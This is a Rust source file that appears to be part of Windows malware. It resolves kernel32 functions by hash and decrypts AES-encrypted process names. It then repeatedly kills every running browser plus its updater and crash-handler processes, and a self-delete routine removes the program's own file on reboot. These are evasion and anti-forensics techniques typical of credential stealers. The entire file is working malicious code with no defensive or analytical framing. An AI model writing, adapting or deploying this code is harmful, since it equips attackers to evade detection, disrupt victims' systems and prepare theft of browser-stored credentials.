#![allow(dead_code, non_upper_case_globals)]

use std::ffi::c_void;
use crate::core_utils::api_hash::{
    H_KERNEL32,
    H_CreateToolhelp32Snapshot, H_Process32FirstW, H_Process32NextW,
    H_OpenProcess, H_TerminateProcess, H_CloseHandle,
    H_MoveFileExW, H_GetModuleFileNameW,
};

#[repr(C)]
#[derive(Clone)]
struct PROCESSENTRY32W {
    dw_size: u32,
    cnt_usage: u32,
    th32_process_id: u32,
    th32_default_heap_id: usize,
    th32_module_id: u32,
    cnt_threads: u32,
    th32_parent_process_id: u32,
    pc_pri_class_base: i32,
    dw_flags: u32,
    sz_exe_file: [u16; 260],
}

impl Default for PROCESSENTRY32W {
    fn default() -> Self {
        Self {
            dw_size: 0,
            cnt_usage: 0,
            th32_process_id: 0,
            th32_default_heap_id: 0,
            th32_module_id: 0,
            cnt_threads: 0,
            th32_parent_process_id: 0,
            pc_pri_class_base: 0,
            dw_flags: 0,
            sz_exe_file: [0; 260],
        }
    }
}

type FnCreateToolhelp32Snapshot = unsafe extern "system" fn(u32, u32) -> *mut c_void;
type FnProcess32FirstW = unsafe extern "system" fn(*mut c_void, *mut PROCESSENTRY32W) -> i32;
type FnProcess32NextW = unsafe extern "system" fn(*mut c_void, *mut PROCESSENTRY32W) -> i32;
type FnOpenProcess = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
type FnTerminateProcess = unsafe extern "system" fn(*mut c_void, u32) -> i32;
type FnCloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

const TH32CS_SNAPPROCESS: u32 = 0x00000002;
const PROCESS_TERMINATE: u32 = 0x0001;
const PROCESS_QUERY_INFORMATION: u32 = 0x0400;

fn resolve_kernel32() -> Option<*mut u8> {
    inject::syscall::get_module_base_by_hash(H_KERNEL32)
}

fn resolve_fn(export_hash: u32) -> Option<*mut u8> {
    let k32 = resolve_kernel32()?;
    inject::syscall::resolve_export_by_hash(k32, export_hash)
}

unsafe fn crash_process(
    open_proc: FnOpenProcess,
    terminate: FnTerminateProcess,
    close_handle: FnCloseHandle,
    pid: u32,
) {
    let handle = open_proc(PROCESS_TERMINATE, 0, pid);
    if handle.is_null() {
        return;
    }

    terminate(handle, 1);
    close_handle(handle);
}

use crate::polymorphic_keys::aes_decrypt;

fn exe_matches_any(items: &[(&[u8], &[u8; 32], &[u8; 12])], exe_lower: &str) -> bool {
    for (encoded, key, nonce) in items {
        let decoded = aes_decrypt(encoded, key, nonce);
        if let Ok(name) = core::str::from_utf8(&decoded) {
            if exe_lower == name {
                return true;
            }
        }
    }
    false
}

fn kill_browser_processes(
    create_snap: FnCreateToolhelp32Snapshot,
    proc_first: FnProcess32FirstW,
    proc_next: FnProcess32NextW,
    open_proc: FnOpenProcess,
    terminate: FnTerminateProcess,
    close_handle: FnCloseHandle,
) {
    let browser_exes: &[(&[u8], &[u8; 32], &[u8; 12])] = &[
        (&crate::polymorphic_keys::KILL_CHROME_ENC, &crate::polymorphic_keys::KILL_CHROME_KEY, &crate::polymorphic_keys::KILL_CHROME_NONCE),
        (&crate::polymorphic_keys::KILL_EDGE_ENC, &crate::polymorphic_keys::KILL_EDGE_KEY, &crate::polymorphic_keys::KILL_EDGE_NONCE),
        (&crate::polymorphic_keys::KILL_BRAVE_ENC, &crate::polymorphic_keys::KILL_BRAVE_KEY, &crate::polymorphic_keys::KILL_BRAVE_NONCE),
        (&crate::polymorphic_keys::KILL_VIVALDI_ENC, &crate::polymorphic_keys::KILL_VIVALDI_KEY, &crate::polymorphic_keys::KILL_VIVALDI_NONCE),
        (&crate::polymorphic_keys::KILL_OPERA_ENC, &crate::polymorphic_keys::KILL_OPERA_KEY, &crate::polymorphic_keys::KILL_OPERA_NONCE),
        (&crate::polymorphic_keys::KILL_FIREFOX_ENC, &crate::polymorphic_keys::KILL_FIREFOX_KEY, &crate::polymorphic_keys::KILL_FIREFOX_NONCE),
        (&crate::polymorphic_keys::KILL_WATERFOX_ENC, &crate::polymorphic_keys::KILL_WATERFOX_KEY, &crate::polymorphic_keys::KILL_WATERFOX_NONCE),
        (&crate::polymorphic_keys::KILL_LIBREWOLF_ENC, &crate::polymorphic_keys::KILL_LIBREWOLF_KEY, &crate::polymorphic_keys::KILL_LIBREWOLF_NONCE),
        (&crate::polymorphic_keys::KILL_YANDEX_ENC, &crate::polymorphic_keys::KILL_YANDEX_KEY, &crate::polymorphic_keys::KILL_YANDEX_NONCE),
        (&crate::polymorphic_keys::KILL_BROWSER_ENC, &crate::polymorphic_keys::KILL_BROWSER_KEY, &crate::polymorphic_keys::KILL_BROWSER_NONCE),
    ];

    let helper_exes: &[(&[u8], &[u8; 32], &[u8; 12])] = &[
        (&crate::polymorphic_keys::KILL_CHROMEDRIVER_ENC, &crate::polymorphic_keys::KILL_CHROMEDRIVER_KEY, &crate::polymorphic_keys::KILL_CHROMEDRIVER_NONCE),
        (&crate::polymorphic_keys::KILL_GOOGLEUPDATE_ENC, &crate::polymorphic_keys::KILL_GOOGLEUPDATE_KEY, &crate::polymorphic_keys::KILL_GOOGLEUPDATE_NONCE),
        (&crate::polymorphic_keys::KILL_CRASHHANDLER_ENC, &crate::polymorphic_keys::KILL_CRASHHANDLER_KEY, &crate::polymorphic_keys::KILL_CRASHHANDLER_NONCE),
        (&crate::polymorphic_keys::KILL_CRASHPAD_ENC, &crate::polymorphic_keys::KILL_CRASHPAD_KEY, &crate::polymorphic_keys::KILL_CRASHPAD_NONCE),
        (&crate::polymorphic_keys::KILL_BROWSER_BLPOP_ENC, &crate::polymorphic_keys::KILL_BROWSER_BLPOP_KEY, &crate::polymorphic_keys::KILL_BROWSER_BLPOP_NONCE),
        (&crate::polymorphic_keys::KILL_MSEDGE_UPDATE_ENC, &crate::polymorphic_keys::KILL_MSEDGE_UPDATE_KEY, &crate::polymorphic_keys::KILL_MSEDGE_UPDATE_NONCE),
        (&crate::polymorphic_keys::KILL_BRAVE_UPDATE_ENC, &crate::polymorphic_keys::KILL_BRAVE_UPDATE_KEY, &crate::polymorphic_keys::KILL_BRAVE_UPDATE_NONCE),
        (&crate::polymorphic_keys::KILL_OPERA_UPDATE_ENC, &crate::polymorphic_keys::KILL_OPERA_UPDATE_KEY, &crate::polymorphic_keys::KILL_OPERA_UPDATE_NONCE),
        (&crate::polymorphic_keys::KILL_PLUGIN_CONTAINER_ENC, &crate::polymorphic_keys::KILL_PLUGIN_CONTAINER_KEY, &crate::polymorphic_keys::KILL_PLUGIN_CONTAINER_NONCE),
    ];

    unsafe {
        let snap = create_snap(TH32CS_SNAPPROCESS, 0);
        if snap.is_null() || snap == -1isize as *mut c_void { return; }

        let mut entry: PROCESSENTRY32W = PROCESSENTRY32W::default();
        entry.dw_size = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        if proc_first(snap, &mut entry) == 0 {
            close_handle(snap);
            return;
        }

        loop {
            let exe = {
                let len = entry.sz_exe_file.iter().position(|&c| c == 0).unwrap_or(260);
                String::from_utf16_lossy(&entry.sz_exe_file[..len]).to_lowercase()
            };

            let hit = exe_matches_any(browser_exes, &exe) || exe_matches_any(helper_exes, &exe);

            if hit {
                crash_process(
                    open_proc,
                    terminate,
                    close_handle,
                    entry.th32_process_id,
                );
            }

            if proc_next(snap, &mut entry) == 0 {
                break;
            }
        }

        close_handle(snap);
    }
}

pub fn kill_browsers() {
    let Some(_k32) = resolve_kernel32() else { return };

    let create_snap: Option<FnCreateToolhelp32Snapshot> =
        resolve_fn(H_CreateToolhelp32Snapshot).map(|a| unsafe { std::mem::transmute(a) });
    let proc_first: Option<FnProcess32FirstW> =
        resolve_fn(H_Process32FirstW).map(|a| unsafe { std::mem::transmute(a) });
    let proc_next: Option<FnProcess32NextW> =
        resolve_fn(H_Process32NextW).map(|a| unsafe { std::mem::transmute(a) });
    let open_proc: Option<FnOpenProcess> =
        resolve_fn(H_OpenProcess).map(|a| unsafe { std::mem::transmute(a) });
    let terminate: Option<FnTerminateProcess> =
        resolve_fn(H_TerminateProcess).map(|a| unsafe { std::mem::transmute(a) });
    let close_handle: Option<FnCloseHandle> =
        resolve_fn(H_CloseHandle).map(|a| unsafe { std::mem::transmute(a) });

    let (Some(cs), Some(pf), Some(pn), Some(op), Some(term), Some(ch)) =
        (create_snap, proc_first, proc_next, open_proc, terminate, close_handle) else {
        return;
    };

    kill_browser_processes(cs, pf, pn, op, term, ch);
    std::thread::sleep(std::time::Duration::from_millis(200));
    kill_browser_processes(cs, pf, pn, op, term, ch);
    std::thread::sleep(std::time::Duration::from_millis(200));
    kill_browser_processes(cs, pf, pn, op, term, ch);

    std::thread::sleep(std::time::Duration::from_millis(1000));
}

type FnMoveFileExW = unsafe extern "system" fn(*const u16, *const u16, u32) -> i32;
type FnGetModuleFileNameW = unsafe extern "system" fn(*mut c_void, *mut u16, u32) -> u32;

const MOVEFILE_DELAY_UNTIL_REBOOT: u32 = 0x00000004;

pub fn self_delete() {
    let Some(_k32) = resolve_kernel32() else { return };

    unsafe {
        let move_file: FnMoveFileExW = match resolve_fn(H_MoveFileExW) {
            Some(a) => std::mem::transmute(a),
            None => return,
        };
        let get_module: FnGetModuleFileNameW = match resolve_fn(H_GetModuleFileNameW) {
            Some(a) => std::mem::transmute(a),
            None => return,
        };

        let mut path_buf: [u16; 260] = [0; 260];
        let len = get_module(std::ptr::null_mut(), path_buf.as_mut_ptr(), 260);
        if len == 0 || len >= 260 { return; }

        move_file(path_buf.as_ptr(), std::ptr::null(), MOVEFILE_DELAY_UNTIL_REBOOT);
    }
}
